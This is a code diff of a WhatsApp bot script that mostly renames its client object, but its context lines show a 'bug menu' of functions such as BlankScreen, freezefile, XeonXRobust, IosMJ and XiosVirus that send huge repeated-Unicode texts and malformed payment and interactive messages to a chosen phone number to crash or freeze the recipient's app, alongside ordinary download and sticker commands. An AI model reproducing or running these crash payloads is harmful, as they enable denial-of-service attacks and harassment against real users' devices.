@@ -10,7 +10,7 @@ const yts = require ('yt-search');
 const didyoumean = require('didyoumean');
 const similarity = require('similarity')
 
-module.exports = async (AndraZyy, m) => {
+module.exports = async (Lazack28, m) => {
 try {
 const from = m.key.remoteJid
 var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
@@ -25,15 +25,15 @@ const isCmd = body.startsWith(prefix);
 const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
 const args = body.trim().split(/ +/).slice(1)
 const text = q = args.join(" ")
-const sender = m.key.fromMe ? (AndraZyy.user.id.split(':')[0]+'@s.whatsapp.net' || AndraZyy.user.id) : (m.key.participant || m.key.remoteJid)
-const botNumber = await AndraZyy.decodeJid(AndraZyy.user.id)
+const sender = m.key.fromMe ? (Lazack28.user.id.split(':')[0]+'@s.whatsapp.net' || Lazack28.user.id) : (m.key.participant || m.key.remoteJid)
+const botNumber = await Lazack28.decodeJid(Lazack28.user.id)
 const senderNumber = sender.split('@')[0]
 const isCreator = (m && m.sender && [botNumber, ...global.nomerOwner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
 const pushname = m.pushName || `${senderNumber}`
 const isBot = botNumber.includes(senderNumber)
 const quoted = m.quoted ? m.quoted : m
 const mime = (quoted.msg || quoted).mimetype || ''
-const groupMetadata = m.isGroup ? await AndraZyy.groupMetadata(from).catch(e => {}) : ''
+const groupMetadata = m.isGroup ? await Lazack28.groupMetadata(from).catch(e => {}) : ''
 const groupName = m.isGroup ? groupMetadata.subject : ''
 const participants = m.isGroup ? await groupMetadata.participants : ''
 const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
@@ -47,7 +47,7 @@ if (m.message) {
 console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
 }
 try {
-ppuser = await AndraZyy.profilePictureUrl(m.sender, 'image')
+ppuser = await Lazack28.profilePictureUrl(m.sender, 'image')
 } catch (err) {
 ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
 }
@@ -56,21 +56,21 @@ ppnyauser = await getBuffer(ppuser)
 if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
 var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
 if (get_data_respon.isImage === false) {
-AndraZyy.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
+Lazack28.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
 quoted: m
 })
 } else {
-AndraZyy.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
+Lazack28.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
 quoted: m
 })
 }
 }
-//FUNCTION ABAL ABAL  by AndraZyy 🗿
+//FUNCTION ABAL ABAL  by Lazack28 🗿
     async function LocSystem(target) {
             let virtex = "⿻ 🔐 LAZACK-BUD-BOTS ⿻";
             let memekz = Date.now();
 
-            await AndraZyy.relayMessage(target, {
+            await Lazack28.relayMessage(target, {
                 groupMentionedMessage: {
                     message: {
                         interactiveMessage: {
@@ -95,7 +95,7 @@ quoted: m
             }, { participant: { jid: target } });            
         };
   async function f10(target, Ptcp = false) {
-    await AndraZyy.relayMessage(target, {
+    await Lazack28.relayMessage(target, {
       extendedTextMessage: {
         text: "`🔐 LAZACK-BUD-BOTS`\n>  ͆ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺\n" + "ી".repeat(55000),
         contextInfo: {
@@ -195,7 +195,7 @@ console.log(chalk.red.bold('🔐 lazack bugs bot'))
 async function XeonXRobust(target, Ptcp = true) {
   const jids = `_*~@0~*_\n`.repeat(10200);
   const ui = "ꦽ".repeat(10000);
-  await AndraZyy.relayMessage(target, {
+  await Lazack28.relayMessage(target, {
     ephemeralMessage: {
       message: {
         interactiveMessage: {
@@ -403,11 +403,11 @@ async function XeonXRobust(target, Ptcp = true) {
         }
     };
 
-    AndraZyy.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
+    Lazack28.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
 }
  async function BlankScreen(target, Ptcp = false) {
 let virtex = "🔐 LAZACK-BUD-BOTS" + "ྫྷ".repeat(77777) + "@0".repeat(50000);
-			await AndraZyy.relayMessage(target, {
+			await Lazack28.relayMessage(target, {
 					ephemeralMessage: {
 						message: {
 							interactiveMessage: {
@@ -476,7 +476,7 @@ let virtex = "🔐 LAZACK-BUD-BOTS" + "ྫྷ".repeat(77777) + "@0".repeat(50000);
    	};
 async function freezefile(target, QBug, Ptcp = true) {
     let virtex = "🔐 LAZACK-BUD-BOTS" + "ြ".repeat(25000);
-    await AndraZyy.relayMessage(target, {
+    await Lazack28.relayMessage(target, {
         groupMentionedMessage: {
             message: {
                 interactiveMessage: {
@@ -511,7 +511,7 @@ async function freezefile(target, QBug, Ptcp = true) {
     }, { participant: { jid: target } }, { messageId: null });
 }
 async function thunderblast_notif(target) {
-			await AndraZyy.relayMessage(target, {
+			await Lazack28.relayMessage(target, {
 					ephemeralMessage: {
 						message: {
 							interactiveMessage: {
@@ -579,7 +579,7 @@ async function thunderblast_notif(target) {
 			);
 		};
 	async function crashui2(target, ptcp = false) {
-    await AndraZyy.relayMessage(target, {
+    await Lazack28.relayMessage(target, {
         groupMentionedMessage: {
             message: {
                 interactiveMessage: {
@@ -604,7 +604,7 @@ async function thunderblast_notif(target) {
     }, { participant: { jid: target } }, { messageId: null });
 }
 async function IosMJ(target, Ptcp = false) {
-      await AndraZyy.relayMessage(
+      await Lazack28.relayMessage(
         target,
         {
           extendedTextMessage: {
@@ -725,7 +725,7 @@ async function crashX(target, kuwoted) {
  "mediaKeyTimestamp": "1715880173"
  }
 }), { userJid: target, quoted: kuwoted });
-await AndraZyy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
+await Lazack28.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
 }
 
 async function crashbeta(target, ptcp = false) {
@@ -765,7 +765,7 @@ const messageContent = {
 
 async function Bug2(target, ptcp = false) {
     let akumw = "🔐 LAZACK-BUD-BOTS" + "ꦿꦾ꧀".repeat(50000);
-    await AndraZyy.relayMessage(target, {
+    await Lazack28.relayMessage(target, {
         groupMentionedMessage: {
             message: {
                 interactiveMessage: {
@@ -802,7 +802,7 @@ async function Bug2(target, ptcp = false) {
 
 async function DocBug(target) {
  let virtex = "🔐 LAZACK-BUD-BOTS";
-   AndraZyy.relayMessage(target, {
+   Lazack28.relayMessage(target, {
      groupMentionedMessage: {
        message: {
         interactiveMessage: {
@@ -836,7 +836,7 @@ async function DocBug(target) {
             }, { participant: { jid: target } });
         };
 async function LocaBugs(target) {
- await AndraZyy.relayMessage(target, {
+ await Lazack28.relayMessage(target, {
         groupMentionedMessage: {
             message: {
                 interactiveMessage: {
@@ -861,7 +861,7 @@ async function LocaBugs(target) {
     }, { participant: { jid: target } }, { messageId: null });
 }
 async function killui(target, Ptcp = true) {
-      await AndraZyy.relayMessage(
+      await Lazack28.relayMessage(
         target,
         {
           ephemeralMessage: {
@@ -955,11 +955,11 @@ message: {
   }
 }
 }), { userJid: target, quoted: kuwoted })
-await AndraZyy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
+await Lazack28.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
 }
     
 async function func1(target) {
-    await AndraZyy.relayMessage(target, {
+    await Lazack28.relayMessage(target, {
         groupMentionedMessage: {
             message: {
                 interactiveMessage: {
@@ -985,18 +985,18 @@ async function func1(target) {
 }
 
 async function aipong(target) {
-await AndraZyy.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
+await Lazack28.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
 }
 async function iponcrash(target) {
-await AndraZyy.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
+await Lazack28.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
 sleep(200)
-await AndraZyy.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
+await Lazack28.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
 sleep(200)
-await AndraZyy.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
+await Lazack28.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
 }
 //bug ios
 async function UpiCrash(target) {
-      await AndraZyy.relayMessage(
+      await Lazack28.relayMessage(
         target,
         {
           paymentInviteMessage: {
@@ -1013,7 +1013,7 @@ async function UpiCrash(target) {
     }
 
     async function VenCrash(target) {
-      await AndraZyy.relayMessage(
+      await Lazack28.relayMessage(
         target,
         {
           paymentInviteMessage: {
@@ -1030,7 +1030,7 @@ async function UpiCrash(target) {
     }
 
     async function AppXCrash(target) {
-      await AndraZyy.relayMessage(
+      await Lazack28.relayMessage(
         target,
         {
           paymentInviteMessage: {
@@ -1047,7 +1047,7 @@ async function UpiCrash(target) {
     }
 
     async function SmCrash(target) {
-      await AndraZyy.relayMessage(
+      await Lazack28.relayMessage(
         target,
         {
           paymentInviteMessage: {
@@ -1078,7 +1078,7 @@ async function newsLetter(target) {
                         },
                     },
                 };
-                await AndraZyy.relayMessage(target, messsage, {
+                await Lazack28.relayMessage(target, messsage, {
                     userJid: target,
                 });
             }
@@ -1088,7 +1088,7 @@ async function newsLetter(target) {
         }
 
     async function SqCrash(target) {
-      await AndraZyy.relayMessage(
+      await Lazack28.relayMessage(
         target,
         {
           paymentInviteMessage: {
@@ -1105,7 +1105,7 @@ async function newsLetter(target) {
     }
 
     async function FBiphone(target) {
-      await AndraZyy.relayMessage(
+      await Lazack28.relayMessage(
         target,
         {
           paymentInviteMessage: {
@@ -1123,7 +1123,7 @@ async function newsLetter(target) {
 
     async function QXIphone(target) {
       let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(60000);
-      await AndraZyy.relayMessage(
+      await Lazack28.relayMessage(
         target,
         {
           locationMessage: {
@@ -1142,7 +1142,7 @@ async function newsLetter(target) {
     }
 
     async function QPayIos(target) {
-      await AndraZyy.relayMessage(
+      await Lazack28.relayMessage(
         target,
         {
           paymentInviteMessage: {
@@ -1159,7 +1159,7 @@ async function newsLetter(target) {
     }
 
     async function QPayStriep(target) {
-      await AndraZyy.relayMessage(
+      await Lazack28.relayMessage(
         target,
         {
           paymentInviteMessage: {
@@ -1176,7 +1176,7 @@ async function newsLetter(target) {
     }
 
     async function QDIphone(target) {
-      AndraZyy.relayMessage(
+      Lazack28.relayMessage(
         target,
         {
           extendedTextMessage: {
@@ -1214,7 +1214,7 @@ async function newsLetter(target) {
 
     //
     async function XiosVirus(target) {
-      AndraZyy.relayMessage(
+      Lazack28.relayMessage(
         target,
         {
           extendedTextMessage: {
@@ -1247,7 +1247,7 @@ async function newsLetter(target) {
 
 const premium = JSON.parse(fs.readFileSync('./database/premium.json'))
 const isPremium = [botNumber, ...premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
-AndraZyy.sendContact = async (jid, kon, quoted = '', opts = {}) => {
+Lazack28.sendContact = async (jid, kon, quoted = '', opts = {}) => {
 let list = []
 for (let i of kon) {
 list.push({
@@ -1267,7 +1267,7 @@ item4.X-ABLabel:Region\n
 END:VCARD`
 })
 }
-AndraZyy.sendMessage(jid, { contacts: { displayName: `${list.length} Contact`, contacts: list }, ...opts }, { quoted })
+Lazack28.sendMessage(jid, { contacts: { displayName: `${list.length} Contact`, contacts: list }, ...opts }, { quoted })
 }
 
 
@@ -1292,9 +1292,9 @@ const resize = async (image, width, height) => {
 
 async function downloadMp3 (link) {
 try {
-AndraZyy.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
+Lazack28.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
 let kyuu = await fetchJson (`https://api.kyuurzy.site/api/download/aio?query=${link}`)
-AndraZyy.sendMessage(m.chat, { audio: {url: kyuu.result.url}, mimetype: "audio/mpeg"},{ quoted:m})
+Lazack28.sendMessage(m.chat, { audio: {url: kyuu.result.url}, mimetype: "audio/mpeg"},{ quoted:m})
 }catch (err) {
 reply(`${err}`)
 }
@@ -1302,9 +1302,9 @@ reply(`${err}`)
 
 async function downloadMp4 (link) {
 try {
-AndraZyy.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
+Lazack28.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
 let kyuu = await fetchJson(`https://api.kyuurzy.site/api/download/aio?query=${link}`)
-AndraZyy.sendMessage(m.chat, { video: {url: kyuu.result.url}, caption: '' },{ quoted:m})
+Lazack28.sendMessage(m.chat, { video: {url: kyuu.result.url}, caption: '' },{ quoted:m})
 }catch (err) {
 reply(`${err}`)
 }
@@ -1318,7 +1318,7 @@ if (!m.key.fromMe && !isCreator) return
 
 
 const reply = (teks) => { 
-AndraZyy.sendMessage(from, { text: teks, contextInfo: { 
+Lazack28.sendMessage(from, { text: teks, contextInfo: { 
 "externalAdReply": { 
 "showAdAttribution": true, 
 "title": "⚡ lazack developers", 
@@ -1329,7 +1329,7 @@ AndraZyy.sendMessage(from, { text: teks, contextInfo: {
 "sourceUrl": "https://whatsapp.com/channel/" }}}, { quoted: m }) }
 
 const reply2 = (teks) => {
-AndraZyy.sendMessage(from, { text : teks }, { quoted : m })
+Lazack28.sendMessage(from, { text : teks }, { quoted : m })
 }
 
 function getFormattedDate() {
@@ -1492,13 +1492,13 @@ case 'love-you': {
 if (!isPremium) return m.reply(" premium users only ")
 if (!q) return m.reply(`Example:\n ${prefix + command} 255734xxx`)
 BapakLuWkwk = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-AndraZyy.sendMessage(BapakLuWkwk, {text: `💞 I LOVE YOU BOY FROM YOURE LOVE MIRCUS \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`})
+Lazack28.sendMessage(BapakLuWkwk, {text: `💞 I LOVE YOU BOY FROM YOURE LOVE MIRCUS \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`})
 m.reply("done clear chat by lazack😖")
-AndraZyy.sendMessage(m.chat, {audio: fs.readFileSync('./assets/mtaju.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
+Lazack28.sendMessage(m.chat, {audio: fs.readFileSync('./assets/mtaju.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
 }
 break;
 
-case "menu": case "start": case "andrazyy": case "xmenu": case "bugmenu": {
+case "menu": case "start": case "Lazack28": case "xmenu": case "bugmenu": {
 if (!isPremium) return reply(" premium users only ")
 officialist = `${nomerOwner}@s.whatsapp.net`
 whatsappmessage = `
@@ -1507,7 +1507,7 @@ whatsappmessage = `
 ❏ 𝗯𝗼𝘁 𝗻𝗮𝗺𝗲 : LAZACK ADVANCED
 ❏ 𝘃𝗲𝗿𝘀𝗶𝗼𝗻 : 1.0.0
 ❏ 𝗱𝗲𝘃 : TEAM LAZACK 28
-❏ 𝗺𝗼𝗱𝗲 𝗯𝗼𝘁 : *${AndraZyy.public ? "public": "self"}*
+❏ 𝗺𝗼𝗱𝗲 𝗯𝗼𝘁 : *${Lazack28.public ? "public": "self"}*
 
 *\`✰ 𝗕𝘂𝗴 ↯ 𝗠𝗲𝗻𝘂 ✰\`*
 ↯ /love-you 𝗻𝘂𝗺𝗯𝗲𝗿
@@ -1534,8 +1534,8 @@ whatsappmessage = `
 ➢ lazackdevs
 ➢ lazack28
  `
-AndraZyy.sendMessage(from, { image: thumb, caption: whatsappmessage, mentions:[sender, officialist] }, { quoted: m })
-AndraZyy.sendMessage(m.chat, {audio: fs.readFileSync('./assets/mtaju.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
+Lazack28.sendMessage(from, { image: thumb, caption: whatsappmessage, mentions:[sender, officialist] }, { quoted: m })
+Lazack28.sendMessage(m.chat, {audio: fs.readFileSync('./assets/mtaju.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
 }
 break
 case "xvip-fc": {
@@ -1546,7 +1546,7 @@ whatsappmessage = `*\`[ LAZACK BUGS ]\`*
 ❏ 𝗯𝗼𝘁 𝗻𝗮𝗺𝗲 : LAZACK ADVANCED
 ❏ 𝘃𝗲𝗿𝘀𝗶𝗼𝗻 : 15.5.0
 ❏ 𝗱𝗲𝘃 : LAZACK28 TEAM
-❏ 𝗺𝗼𝗱𝗲 𝗯𝗼𝘁 : *${AndraZyy.public ? "public": "self"}*
+❏ 𝗺𝗼𝗱𝗲 𝗯𝗼𝘁 : *${Lazack28.public ? "public": "self"}*
 
 ┏❐⌜ *\`𝐁𝐮𝐠 𝐕𝐢𝐩 𝐗 𝐅𝐜\`* ⌟
 ┃ ↯ beta-fc *<𝐧𝐮𝐦𝐛𝐞𝐫>*
@@ -1564,8 +1564,8 @@ https://whatsapp.com/channel/
 ➢ lazackdevs
 ➢ lazack28
 `
-AndraZyy.sendMessage(from, { image: thumb, caption: whatsappmessage, mentions:[sender, officialist] }, { quoted: m })
-AndraZyy.sendMessage(m.chat, {audio: fs.readFileSync('./assets/mtaju.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
+Lazack28.sendMessage(from, { image: thumb, caption: whatsappmessage, mentions:[sender, officialist] }, { quoted: m })
+Lazack28.sendMessage(m.chat, {audio: fs.readFileSync('./assets/mtaju.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
 }
 break
 
@@ -1589,20 +1589,20 @@ let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎�
 for (let mem of participants) {
 teks += `⊝ @${mem.id.split('@')[0]}\n`
 }
-AndraZyy.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
+Lazack28.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
 }
 break
 
 case "public": {
   if (!isPremium) return reply("sorry, you do not have access");
-  AndraZyy.public = true;
+  Lazack28.public = true;
   reply("*successfully changed the bot to public mode*");
 }
 break
 
 case "self": {
   if (!isPremium) return reply("sorry, you do not have access");
-  AndraZyy.public = false;
+  Lazack28.public = false;
   reply("*successfully changed the bot to self mode*");
 }
 break
@@ -1611,7 +1611,7 @@ case 'addprem':
 if (!isPremium) return reply(" sorry you dont have acess.")
 if (!args[0]) return reply(`Use ${prefix+command} number\nexample${prefix+command} 255734xx`)
 prrkek = q.split("|")[0].replace(/[^0-9]/g, '')
-let ceknya = await AndraZyy.onWhatsApp(prrkek)
+let ceknya = await Lazack28.onWhatsApp(prrkek)
 if (ceknya.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
 premium.push(prrkek)
 fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
@@ -1629,7 +1629,7 @@ reply(`yah ${ya} tidak memiliki akses lagi`)
 break
 
 /**
-  * Andrazyy
+  * Lazack28
   * don't forget to follow
   * https://whatsapp.com/channel/0029VazvJLp5Ui2Skrlhai3n
 */
@@ -1659,7 +1659,7 @@ case "ai": case "leptonai": case "letmegpt": {
 break;
 
 /**
-  * Feature Ai With Logic & Sessions Made by Andrazyy
+  * Feature Ai With Logic & Sessions Made by Lazack28
   * Don't forget to follow
   * https://whatsapp.com/channel/0029VazvJLp5Ui2Skrlhai3n
 */
@@ -1726,7 +1726,7 @@ case 'tiktok': case 'tt': {
 *Saves*: _${data.stats.saveCount ?? ''}_
 \`⏤͟͟͞͞ Downloader By ${global.namaOwner}\`
 `;
- AndraZyy.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m })
+ Lazack28.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m })
 }
 break
 
@@ -1736,8 +1736,8 @@ if (/video/.test(mime)) {
 if ((qmsg).seconds > 15) return reply("Durasi vidio maksimal 15 detik!")
 }
 reply("please wait..")
-var media = await AndraZyyt.downloadAndSaveMediaMessage(qmsg)
-await AndraZyy.sendStimg(m.chat, media, m, {packname: `𝐂𝐫𝐞𝐚𝐭𝐞𝐝 𝐛𝐲 ${namaBot} 👑`})
+var media = await Lazack28t.downloadAndSaveMediaMessage(qmsg)
+await Lazack28.sendStimg(m.chat, media, m, {packname: `𝐂𝐫𝐞𝐚𝐭𝐞𝐝 𝐛𝐲 ${namaBot} 👑`})
 await fs.unlinkSync(media)
 }
 break
@@ -1765,7 +1765,7 @@ case 'splay': {
 - *URL:* ${data.url}`;
 
  // Mengirim pesan informasi lagu
- await AndraZyy.sendMessage(m.chat, { 
+ await Lazack28.sendMessage(m.chat, { 
  text: `${tekswait}`, 
  contextInfo: {
  mentionedJid: [m.sender],
@@ -1788,7 +1788,7 @@ case 'splay': {
  // Memastikan respon adalah tipe audio
  if (response.headers.get("content-type") === "audio/mpeg") {
  // Mengirim audio melalui WhatsApp
- await AndraZyy.sendMessage(m.chat, { audio: { url: downloadApiUrl }, mimetype: 'audio/mpeg' }, { quoted: m });
+ await Lazack28.sendMessage(m.chat, { audio: { url: downloadApiUrl }, mimetype: 'audio/mpeg' }, { quoted: m });
  } else {
  m.reply("Gagal mendapatkan file audio.");
  }
@@ -1808,7 +1808,7 @@ if (!/image/.test(mime)) return reply(`${prefix+command}`)
 reply("please wait..")
 let media = await quoted.download()
 let proses = await remini(media, "enhance");
-AndraZyy.sendMessage(m.chat, { image: proses, caption: 'BERHASIL ENCHANTED ✅'}, { quoted: m})
+Lazack28.sendMessage(m.chat, { image: proses, caption: 'BERHASIL ENCHANTED ✅'}, { quoted: m})
 }
 break
 case 'tourl': {
@@ -1858,7 +1858,7 @@ const catbox = async (content) => {
 📊 *S I Z E :* ${size} Byte
 🔗 *L I N K :* ${link} !
 `
-await AndraZyy.sendMessage(m.chat,{image: {url: link}, caption: caption }, { quoted: qtext2 })
+await Lazack28.sendMessage(m.chat,{image: {url: link}, caption: caption }, { quoted: qtext2 })
 }
 break
 
@@ -1868,9 +1868,9 @@ if (!isCreator && !m.isAdmins) return reply("Only Owner!")
 if (!m.isBotAdmins) return Reply("only admins")
 if (text || m.quoted) {
 const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
-var onWa = await AndraZyy.onWhatsApp(input.split("@")[0])
+var onWa = await Lazack28.onWhatsApp(input.split("@")[0])
 if (onWa.length < 1) return m.reply("really she left")
-const res = await AndraZyy.groupParticipantsUpdate(m.chat, [input], 'remove')
+const res = await Lazack28.groupParticipantsUpdate(m.chat, [input], 'remove')
 await m.reply(`kicked ${input.split("@")[0]} in the group`)
 } else {
 return m.reply(example("@tag/reply"))
@@ -1884,7 +1884,7 @@ if (!isCreator) return
 function Return(sul) {
 sat = JSON.stringify(sul, null, 2)
 bang = util.format(sat)
-if (sat == AndraZyy) {
+if (sat == Lazack28) {
 bang = util.format(sul)
 }
 return m.reply(bang)
